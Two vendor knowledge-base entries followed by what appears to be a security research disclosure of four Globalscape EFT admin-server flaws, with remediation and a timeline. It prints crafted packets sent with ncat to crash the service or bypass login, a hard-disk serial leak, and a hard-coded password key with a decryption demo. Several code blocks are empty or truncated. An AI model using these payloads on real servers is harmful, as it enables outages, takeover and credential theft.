# Is EFT susceptible to the "Remotely obtain HDD serial number" vulnerability?

2 Years Ago

Karla Marsh

[EFT](https://kb.globalscape.com/Knowledgebase/category/10/EFT)

**THE INFORMATION IN THIS ARTICLE APPLIES TO:**

* EFT v8.0.0.38 - 8.1.0.14
* This issue will be addressed in a future release (not in a patch)

**QUESTION**

Is EFT susceptible to the "Remotely obtain HDD serial number" vulnerability?

**ANSWER**

An unauthenticated endpoint on EFT server returns a lightly-obfuscated base64 string that represents the numerical hard drive identifier. This is not a practical concern unless the administration port is exposed to external networks.

You can be vulnerable if you are:

* Administering EFT remotely
* Allowing EFT remote administration to be initiated from the Internet
* Using the default port
* Not whitelisting trusted IP addresses

**MORE INFORMATION**

This can be mitigated by limiting access to administer EFT at the network level. You may be affected if you allow remote administration to EFT to be initiated from the internet. As stated in our [best practices](https://kb.globalscape.com/Knowledgebase/11312/Configuration-and-Security-Best-Practices), do not expose port 1100 to the internet. You will always want to whitelist trusted IP addresses. The most secure method is it disallow remote administration outside of the host EFT server and only login in via localhost (::1 or 127.0.0.1).

# Is EFT susceptible to the "Denial of service via recursive Deflate Stream" vulnerability?

2 Years Ago

Karla Marsh

[EFT](https://kb.globalscape.com/Knowledgebase/category/10/EFT)

**THE INFORMATION IN THIS ARTICLE APPLIES TO:**

* EFT v8.0.0.38 and 8.0.x
* This is fixed in EFT v8.1.0.16

**QUESTION**

Is EFT susceptible to the "Denial of service via recursive Deflate Stream" vulnerability?

**ANSWER**

Yes, you can be vulnerable if you are:

* Administering EFT remotely
* Allowing EFT remote administration to be initiated from the Internet
* Using the default port
* Not whitelisting trusted IPs

**MORE INFORMATION**

Sending a recursively compressed packet (a "quine") to the administration port can crash EFT. This can be mitigated by limiting access to administer EFT at the network level. You may be affected if you allow remote administration to EFT to be initiated from the internet. As stated in our [best practices](https://kb.globalscape.com/Knowledgebase/11312/Configuration-and-Security-Best-Practices), do not expose port 1100 to the internet. You will always want to whitelist trusted IPs. The most secure method is to disallow remote administration outside of the host EFT server and only login in via localhost (::1 or 127.0.0.1).

Earlier this year, Rapid7 researchers undertook a project to analyze managed file transfer applications, due to the number of [recent vulnerabilities](https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/) [discovered](https://www.rapid7.com/blog/post/2023/03/28/etr-active-exploitation-of-ibm-aspera-faspex-cve-2022-47986/) in those types of applications. We chose Fortra Globalscape EFT as a target since it's reasonably popular and seemed complex enough to have some bugs (plus, it's owned by the same company as GoAnywhere, which was exploited by the Cl0p ransomware gang [earlier this year](https://www.rapid7.com/blog/post/2023/02/03/exploitation-of-goanywhere-mft-zero-day-vulnerability/)). Today, we are disclosing four issues that we uncovered in the Globalscape administration server, the worst of which can lead to remote code execution as the `SYSTEM` user if successfully exploited (which is difficult, as we'll see below).

The issues we reported affect Fortra Globalscape 8.0.x up to 8.1.0.14, and all but one are fixed in 8.1.0.16 (the outstanding issue is currently unfixed, but minor):

* CVE-2023-2989 - Authentication bypass via out-of-bounds memory read ([vendor advisory](https://kb.globalscape.com/Knowledgebase/11586/Is-EFT-susceptible-to-the-Authentication-Bypass-via-Outofbounds-Memory-Read-vulnerability))
* CVE-2023-2990 - Denial of service due to recursive DeflateStream ([vendor advisory](https://kb.globalscape.com/Knowledgebase/11588/Is-EFT-susceptible-to-the-Denial-of-service-via-recursive-Deflate-Stream-vulnerability))
* CVE-2023-2991 - Remote hard drive serial number disclosure ([vendor advisory](https://kb.globalscape.com/Knowledgebase/11589/Is-EFT-susceptible-to-the-Remotely-obtain-HDD-serial-number-vulnerability)) (not currently fixed)
* Additional issue - Password leak due to insecure default configuration ([vendor advisory](https://kb.globalscape.com/Knowledgebase/11587/Is-EFT-susceptible-to-the-Password-Leak-Due-to-Insecure-Defaults-vulnerability))

We performed these tests on Globalscape version 8.1.0.11 on Windows Server 2022, but the impact should be the same on any Windows version.

## Credit

This issue was discovered by [Ron Bowes](https://infosec.exchange/%40iagox86) of Rapid7. We are disclosing it in accordance with Rapid7’s vulnerability disclosure policy.

## Impact

The theoretical impact of the worst vulnerability—CVE-2023-2989—is remote code execution as the `SYSTEM` user. However, exploitation relies on a tricky confluence of circumstances and an unlikely guess, which means that the odds of exploitation in the wild are low (unless somebody finds a way to develop a more reliable exploit).

## Technical Details

Our research project focused on the Globalscape administration server, which runs on TCP port 1100 by default. Port 1100 is the interface used by privileged users when they connect to the service using the remote administration client, as well as the interface used by administrators to make site-wide changes (which means it shouldn't be connected to the public internet). A valid administration session can execute Windows commands on the server in the context of the service user, which is `SYSTEM` by default. This means that bypassing the authentication on the server leads directly to remote code execution.

We will begin by detailing the network protocol. Then, with knowledge of how the protocol works, we'll look at each issue.

A partial implementation of the protocol, as well as proofs of concept for each of these issues, are available in a Github project called [Gestalt](https://github.com/rbowes-r7/gestalt). We'll link to the individual proof of concept in each session.

### Globalscape Admin Protocol

To make any sense of the remainder of this disclosure, we need to learn a bit about the Globalscape admin protocol that Globalscape EFT uses. Since we don't have source code, we've reverse engineered how the protocol works and identified names and fields as best as we could. The original protocol implementation is in the service executable, `cftpstes.exe`, and ours is in [libgestalt.rb](https://github.com/rbowes-r7/gestalt/blob/main/libgestalt/libgestalt.rb).

Globalscape EFT's administrator service is a binary-based protocol that runs on TCP port 1100 by default. Each message has a short (8-byte) header followed by zero or more parameters in an optional body.

The header is always comprised of exactly two 32-bit little-endian fields:

* (32-bit) Packet length - used as part of the TCP protocol to read a full message off the wire, and also tells the parser when to stop reading packet data
* (32-bit) Message ID - used to multiplex different message types (without authenticating, permitted messages are 0x01 (login), and 0x138-0x13a (licensing stuff))

If the message length is longer than 8 bytes, the message also has a body, which is composed of one or more parameters. Parameters in the body are formatted as a pretty typical type-length-value (TLV) structure, with human-readable field names to distinguish which field is which. The structure of the body is:

* (32-bit) User-readable field name (such as `PSWD` for password and `ADLN` for username)
* (32-bit) Type (the type is almost always 5, which is length-prefixed free-form data, but other types exist as well)
* (Variable) Value; if the packet type is 5, it's a length-prefixed free-form data structure:
  + (32-bit) Parameter length
  + (Variable) Value — the value is structured differently depending on the field name

The other noteworthy type is 1, in which case the parameter value is a 32-bit integer.

For example, here's a login message:

```
          |       header        |  body.......
00000000  5e 00 00 00 01 00 00 00  50 53 57 44 05 00 00 00   ^....... PSWD....

00000020  d5 ae 18 40 64 c4 04 ed  c1 08 78 b3 9e c6 4a 57   ...@d... ..x...JW
00000030  c6 1d b6 8d 49 24 0b 8b  41 44 4c 4e 05 00 00 00   ....I$.. ADLN....
00000040  0a 00 00 00 fc ff ff ff  72 00 6f 00 6e 00 41 4d   ........ r.o.n.AM

```

We can break down that message into the header and body, then named parameters within the body:

* Header (8 bytes):
  + Length: 0x0000005e (94 bytes)
  + Message id: 0x00000001 (login)
* Body (86 bytes):
  + Field 1:`PSWD` (encrypted password)
    - `0x00000005` - type
    - `0x00000024` - length (0x24 bytes)
    - `\x20\x00\x00\x00\x86\x40...` - value (encrypted password w/ length prefix)
  + Field 2: `ADLN` (username)
    - `0x00000005` - type
    - `0x0000000a` - length (0x0a bytes)
    - `\xfc\xff\xff\xff\x72\x00\x6f\x00\x6e\x00` - value ("ron" w/ inverted length prefix (which appears to indicate UTF-16 encoding))
  + Field 3: `AMID` - login type
    - `0x00000005` - type
    - `0x00000004` - length (4 bytes)
    - `0x00000000` - value (0 = EFT authentication)

All messages follow this structure, although each message ID has a different set of required parameters. The named parameters don't need to be in any particular order.

#### Compression

A special message ID, `0xff7f`, indicates that the body of the message is a full message (header and all), compressed as a Zlib deflate stream. A compressed version of the same login message from above might look like this:

```
00000000  5f 00 00 00 7f ff 00 00  78 9c 8b 63 60 60 60 04   _....... x..c```.

00000030  62 f3 bc 63 5e e1 c7 64  b7 f5 7a aa 70 77 3b ba   b..c^..d ..z.pw;.

```

This compressed message has a length of `0x0000005f`, message ID of `0x0000ff7f`, and a body of `\x78\x9c\x8b....`. The `\x78` at the start indicates that it's likely a `deflate` stream (and it is). If we use the `openssl` command-line utility to un-deflate the data, we get back the original message:

```
$ echo -ne "\x78\x9c\x8b\x63\x60\x60\x60\x04\xe2\x80\xe0\x70\x17\x56\x20\xad\x02\xc4\x0a\x40\xdc\xe6\x50\x78\xef\xd2\xab\x79\x42\x57\xd7\x49\x38\xa4\x1c\x61\x79\x7b\x90\xa3\x62\xf3\xbc\x63\x5e\xe1\xc7\x64\xb7\xf5\x7a\xaa\x70\x77\x3b\xba\xf8\xf8\x81\xd4\x73\x01\xf1\x9f\xff\xff\xff\x17\x31\xe4\x33\xe4\x31\x38\xfa\x7a\x82\x4d\x61\x61\x80\x00\x00\xbd\x2a\x19\x18" | openssl zlib -d | hexdump -C

```

The remainder of this section will demonstrate issues we discovered in this admin protocol.

### CVE-2023-2989—Authentication Bypass via Out-of-Bounds Read

We discovered a (blind) out-of-bounds memory read in the Globalscape EFT admin server that allows a specially crafted message to parse data anywhere in memory as if it's part of the message itself. Although it's tricky to exploit, an attacker can potentially leverage this issue to authenticate as another user that recently logged in by jumping into their login message and letting the parser believe it's the attacker's login message. We found this by developing a fairly naive fuzzer, which mostly just flips random bits in packets, that you can find [here](https://github.com/rbowes-r7/gestalt/tree/main/fuzz), then determining why the process crashed a bunch of different (but similar) ways. The vendor has published an advisory for this issue [here](https://kb.globalscape.com/Knowledgebase/11586/Is-EFT-susceptible-to-the-Authentication-Bypass-via-Outofbounds-Memory-Read-vulnerability).

Successful exploitation requires a confluence of factors; namely, the attacker must log in shortly after an administrator, while the administrator's login message is still on the heap, then successfully guess the offset between their malicious message and the administrator's login message. We did some experimentation and narrowed down the heap layout well enough to succeed after just a handful of attempts under ideal conditions. You can see how that works in our [proof of concept](https://github.com/rbowes-r7/gestalt/blob/main/oob-memory-read/oob-memory-read-poc.rb), which logs in as the administrator then immediately sends an exploit attempt. This usually works after a small number of attempts in our lab environment (5-10 tries on average).

In the protocol documentation above, we noted that the 32-bit length field at the start of the message is used as part of the TCP protocol to receive exactly one TCP message. That means that if the length field is too large or too small, the TCP `recv()` operation will receive the requested number of bytes (if it can) and, if the message is incomplete or too long, it will simply not be processed. That typically prevents the packet parser from parsing a message with an invalid length.

However, we found a second way to create a message that gets parsed by the same protocol parser but does *not* go through TCP: compressed messages! When a message is *compressed*, the TCP stack is no longer involved, and the prefixed length is not validated in any way. The message parser will attempt to parse the message until it reaches the end, as indicated by the message length field, no matter how much data there actually is; that could be well past the end of available memory.

We can demonstrate this by creating a message with a very very long length (`0x7fffffff`), with a parameter that claims to be `0x41414141` bytes long (lots of other variations also work fine):

```
00000000  ff ff ff 7f 01 00 00 00  50 53 57 44 05 00 00 00   ........ PSWD....
00000010  41 41 41 41                                        AAAA

```

If we send that directly, it will be rejected after the server fails to receive 0x7fffffff bytes. However, if we compress the message, we end up with this 0x21-byte compressed version:

```
00000000  21 00 00 00 7f ff 00 00  78 9c fb ff ff 7f 3d 23   !....... x.....=#
00000010  03 03 43 40 70 b8 0b 2b  90 76 04 02 00 51 27 05   ..C@p..+ .v...Q'.
00000020  c5                                                 .

```

Which we can send with `ncat` or similar tools:

```
$ echo '\x21\x00\x00\x00\x7f\xff\x00\x00\x78\x9c\xfb\xff\xff\x7f\x3d\x23\x03\x03\x43\x40\x70\xb8\x0b\x2b\x90\x76\x04\x02\x00\x51\x27\x05\xc5' | ncat 172.16.166.170 1100

```

The TCP stack easily receives the 0x21 (33) bytes into a buffer. Then it inflates that message into 0x14 bytes of uncompressed data, including the enormous (and unvalidated) length field, which it assumes is correct. Unsurprisingly, that doesn't go well! Since this is a heap overflow on a randomized heap, this proof of concept isn't completely deterministic, but after a few tries the server should crash with an out-of-bounds read of some sort. This particular crash can happen in a variety of places depending on when exactly it reaches the end of available memory (plus, it depends what other values exist in the memory it's trying to parse), which made it tricky to triage fuzzer crashes, but here's one such crash:

```
(1bbc.87c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Globalscape\EFT Server\cftpstes.exe

```

From the registers, we can see that `rdx`, which is used in the memory read, is set to a negative value:

Initially, we categorized this as a denial of service and moved on. Later, we realized that it could actually be leveraged for more. If we could construct a login message that, when parsed, jumps perfectly into another login message, that's an opportunity to use a different user's credentials without ever knowing them.

To develop an exploit that does exactly that, we connected to the service several thousand times, and used a debugger to determine where memory is allocated each time. Because of ASLR (randomized memory addresses), the heap memory allocations move around slightly, but we did narrow down the range quite a bit. Specifically, in our experimentation, our login messages were allocated at memory addresses that are some multiple of 0x70 bytes apart, and usually quite close together. Experimentally, the most common distance between two consecutive messages on Windows Server 2022 was 0x380 bytes, but several other offsets are also common. We developed this message as a demonstration, which assumes the next message starts 0x4d0 bytes after our message, which was the first working offset we discovered:

```
00000000  2e 05 00 00 01 00 00 00  61 61 61 61 05 00 00 00   ........ aaaa....
00000010  c4 04 00 00 00 00 00 00  61 61 61 61 61 61 61 61   ........ aaaaaaaa
00000020  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61   aaaaaaaa aaaaaaaa
00000030  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61   aaaaaaaa aaaaaaaa
00000040  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61   aaaaaaaa aaaaaaaa
00000050  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61   aaaaaaaa aaaaaaaa
00000060  61 61 61 61 61 61 61 61                            aaaaaaaa

```

Which compresses into the following:

```
00000000  25 00 00 00 7f ff 00 00  78 9c d3 63 65 60 60 64   %....... x..ce``d

00000020  00 b7 34 20 d6                                     ..4 .

```

The message claims to be 0x52e bytes long, which means that, as far as the parser is concerned, *our* message will end at the end of the *next* login message in memory!

This malicious login message contains one parameter that claims to be 0x4c4 bytes long with an unused name (`aaaa`). When that parameter is parsed, the parser will read (and discard) the entire 0x4c4-byte field, because a field called `aaaa` isn't something it cares about. But, because the length of the field is 0x4c4 bytes, which doesn't exceed the packet length of 0x52e bytes, the parser will check for the next field 0x4d0 bytes later, which is where the body of the next message starts. So, the parser will happily continue parsing the body of the second message as if it's still part of the same message until it *does* reach the maximum length of 0x52e, which should be exactly where that message ends. That means that the various authentication fields (username/password) will come from that message!

Here's what the messages look like when this attack succeeds:

This succeeds at a rate of approximately 1 in 10, even under ideal conditions; however, a clever attacker may be able to improve that by massaging the heap a bit. Therefore, we believe that this is a high-risk vulnerability, and should be treated as such.

### CVE-2023-2990—Denial of Service Due to Recursive Compression

The Globalscape EFT server can be crashed by sending a recursively compressed packet (a compression "[quine](https://en.wikipedia.org/wiki/Quine_%28computing%29)" to the administration port. We published a proof of concept [here](https://github.com/rbowes-r7/gestalt/tree/main/quine-zip-dos). The vendor has published advisory [here](https://kb.globalscape.com/Knowledgebase/11588/Is-EFT-susceptible-to-the-Denial-of-service-via-recursive-Deflate-Stream-vulnerability).

We found the following function in the Globalscape EFT server, which we called `decompress_and_parse_packet`, that checks for the special compression message ID mentioned above (`0xff7f`):

```

```

Because the function recurses after decompressing, a message that decompresses to itself with an appropriate header will recurse infinitely and quickly crash the Globalscape EFT server.

To develop an exploit, we found [this post](https://research.swtch.com/zip) about how to generate a compression quine with an arbitrary header, which includes ancient Go source code to generate an arbitrary quine in several different formats (.zip, .tar.gz, and .gz). We [updated the Go code](https://github.com/rbowes-r7/gestalt/blob/main/quine-zip-dos/rgzip.go) to compile on modern versions of Go, and to output a raw `deflate` stream. Using our version of that tool, we developed the following "quine" packet, which is also available [in our proof of concept repository](https://github.com/rbowes-r7/gestalt/tree/main/quine-zip-dos):

```

```

We can demonstrate that the body decompresses to itself by using the `openssl` zlib inflation command on the 213-byte message body:

```
$ dd if=recursive.zlib bs=1 skip=8 count=213 2>/dev/null | openssl zlib -d | hexdump -C

```

We can send that message to the Globalscape EFT admin port using Netcat:

```
$ nc -v 172.16.166.170 1100 < recursive.zlib
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 172.16.166.170:1100.

```

And observe the server crash due to stack exhaustion (in a debugger):

```
0:073> g
(12dc.1a68): Stack overflow - code c00000fd (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.

```

We can look at the call stack to verify that it does indeed crash by recursing infinitely and exhausting all stack memory:

```

While the exploit itself is interesting from a development and mathematics perspective, this is ultimately a denial of service, and has no possibility of code execution or other security consequences.

### CVE-2023-2991—Hard Drive Serial Number Disclosure

The hard drive serial number of the server hosting a Globalscape EFT instance can be derived by requesting a TER ("trial extension request") identifier. Presumably, this is an identifier used for uniquely identifying licensed hosts. As of this disclosure, this issue is not fixed, but is also minor enough to disclose (The vendor has disclosed it as a KB [here](https://kb.globalscape.com/Knowledgebase/11589/Is-EFT-susceptible-to-the-Remotely-obtain-HDD-serial-number-vulnerability)). We developed a proof of concept that you can download [here](https://github.com/rbowes-r7/gestalt/tree/main/request-hdd-serial).

If we send a blank (header-only) message of type 0x138 to the administration port, it returns a lightly obfuscated base64 string in a field called `HASH`, and that is internally called a "TER":

```
$ echo -ne '\x08\x00\x00\x00\x38\x01\x00\x00' | nc 172.16.166.170 1100 | hexdump -C

```

The actual string from the `HASH` field is `+k4VG0AT5CU04BD60ZW5vm0GM4CJWpmeLS/Q8FFi0jPP4Ctxg=`, which does not correctly decode as base64:

```
$ echo -ne '+k4VG0AT5CU04BD60ZW5vm0GM4CJWpmeLS/Q8FFi0jPP4Ctxg=' | base64 -d
�N�%4��ѕ��m3��Z��-/��Qb�3��+qbase64: invalid input

```

We reverse engineered the function that generates that value, and determined that six characters—`0`, `8`, `0`, `0`, `0`, and `0`—are inserted into the base64 string at the offsets 14, 33, 5, 38, 21, and 11, in that order (presumably as obfuscation). We can undo that process by removing those six characters in the opposite order, which leaves us with the new base64 string `+k4VGAT5CU4BD6ZW5vmGM4CJWpmeLS/QFFijPP4Ctxg=`. That fixed string *does* successfully decode as base64, into a 256-bit string:

```
$ echo -ne '+k4VGAT5CU4BD6ZW5vmGM4CJWpmeLS/QFFijPP4Ctxg=' | base64 -d | hexdump -C
00000000  fa 4e 15 18 04 f9 09 4e  01 0f a6 56 e6 f9 86 33  |.N.....N...V...3|
00000010  80 89 5a 99 9e 2d 2f d0  14 58 a3 3c fe 02 b7 18  |..Z..-/..X.<....|

```

That string is the SHA256 of the hard drive's serial number. On my server, the serial number is `418934929`, which means we can calculate the SHA256 digest ourselves and validate that it matches the string the server returned:

```
$ echo -ne '418934929' | sha256sum
fa4e151804f9094e010fa656e6f9863380895a999e2d2fd01458a33cfe02b718  -

```

Since the space of possible serial numbers is small, exhaustively brute forcing that integer value is possible in only a few minutes, even on a laptop:

```
$ time ruby ./request-hdd-serial.rb
Sending: ["0800000038010000"]

### Plaintext-Equivalent Passwords in Network Traffic

By default, the remote administration server does not use SSL. We determined that, while the password transmitted on the wire is encrypted, the encryption key is hard-coded and users' passwords can be recovered from a packet capture. We developed [a tool](https://github.com/rbowes-r7/gestalt/tree/main/recover-pw) that will do just that. Although we opted not to assign a CVE to this issue, the vendor has updated the default SSL setting in future versions and has published [an advisory](https://kb.globalscape.com/Knowledgebase/11587/Is-EFT-susceptible-to-the-Password-Leak-Due-to-Insecure-Defaults-vulnerability).

As noted above, administrators can run local Windows commands, which means that a packet capture essentially leads to remote code execution, unless the administrator enables SSL.

Here is an example of a login message that contains an encrypted password:

```
00000000  5e 00 00 00 01 00 00 00  50 53 57 44 05 00 00 00  |^.......PSWD....|

```

It contains three fields: `PSWD` (password), `ADLN` (username), and `AMID` (login type). In our case, we're only concerned with the encrypted password field (`PSWD`), which has the value:

```
\x86\x40\x71\xde\xd2\xea\x9e\x12\xd5\xae\x18\x40\x64\xc4\x04\xed\xc1\x08\x78\xb3\x9e\xc6\x4a\x57\xc6\x1d\xb6\x8d\x49\x24\x0b\x8b

```

Passwords are encrypted using the Twofish algorithm with a static key (`tfgry\0\0\0\0\0\0\0\0\0\0\0`) and blank IV. That means that passwords can be fully decrypted off the wire (although casual observers might believe that the encryption has some value). Here's a demonstration of decrypting that password using the interactive Ruby shell (`irb`) and the `twofish` gem:

```
$ gem install twofish
[...]
$ irb

3.0.2 :001 > require 'twofish'
 => true

3.0.2 :002 > tf = Twofish.new("tfgry\0\0\0\0\0\0\0\0\0\0\0", :padding => :zero_byte, :mode => :cbc)
 => #<Twofish:0x0000000002b23340 [...]>

3.0.2 :003 > tf.iv = "\0" * 16
 => "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000"

3.0.2 :004 > puts (tf.decrypt("\x86\x40\x71\xde\xd2\xea\x9e\x12\xd5\xae\x18\x40\x64\xc4\x04\xed\xc1\x08\x78\xb3\x9e\xc6\x4a\x57\xc6\x1d\xb6\x8d\x49\x24\x0b\x8b") + "\0").force_encoding("UTF-16LE").encode("ASCII-8BIT")
Password1!

```

We use `force_encoding()` and `encode` to convert from UTF-16 to ASCII.

To demonstrate the impact, we wrote a tool that'll decrypt passwords from a PCAP file:

```
$ ruby recover-pw.rb all-login-types.pcapng
Found login: ron / MyWindowsPassword (type = "Windows authentication")
Found login: ron / Password1! (type = "Windows authentication")
Found login: ron / testtest (type = "EFT Authentication")
Found login: ron / Password1! (type = "EFT Authentication")
Found login: WIN-PV9OH13IIUB\Administrator / ******** (type = "Currently logged on user")
 NTLMSSP blob: ["400000004e544c4d535350000100000007b208a209000900370000000f000f00280000000a007c4f0000000f57494e2d5056394f48313349495542574f524b47524f5550"]
Found login: WIN-PV9OH13IIUB\Administrator / ******** (type = "Currently logged on user")
 NTLMSSP blob: ["580000004e544c4d535350000300000000000000580000000000000058000000000000005800000000000000580000000000000058000000000000005800000005c288a20a007c4f0000000fc336e05c920cada6821fe04d5709b868"]

```

Note that NTLM logins use the literal password `********`, but also include an additional NTLMSSP blob containing the actual authentication details.

## Remediation

These issues are fixed in Fortra Globalscape version 8.1.0.16. We don't believe these require emergency patches, but since the ultimate consequence is remote code execution, they should be patched in the next planned patch cycle.

## Rapid7 customers

InsightVM and Nexpose customers can assess their exposure to the CVEs in this disclosure with authenticated vulnerability checks available in the June 22 content release.

## Timeline

* April 2023 - Rapid7 begins researching Globalscape EFT
* May 10, 2023: Rapid7 reports issues to vendor
* May 10, 2023: Vendor acknowledgement
* May 24, 2023: Vendor confirmed the issues
* May 26, 2023: Rapid7 reserves CVEs
* May 26 - June 1, 2023: Vendor and Rapid7 clarify additional details
* June 13, 2023: Rapid7 asks for an update from vendor on patch ETA, proposes July 11 as coordinated disclosure date. Because of a minor misunderstanding, Rapid7 discovers vendor has already released fixes and KBs. Vendor volunteers to pull KBs offline while Rapid7 prepares our own disclosure. Initially, Rapid7 agrees to this.
* June 14, 2023: Rapid7 asks vendor to republish their KBs in the interest of transparency and effective risk assessment while Rapid7 prepares this disclosure
* June 20, 2023 - Vendor informs Rapid7 their KBs have been re-published
* June 22, 2023 - Rapid7 releases this disclosure blog
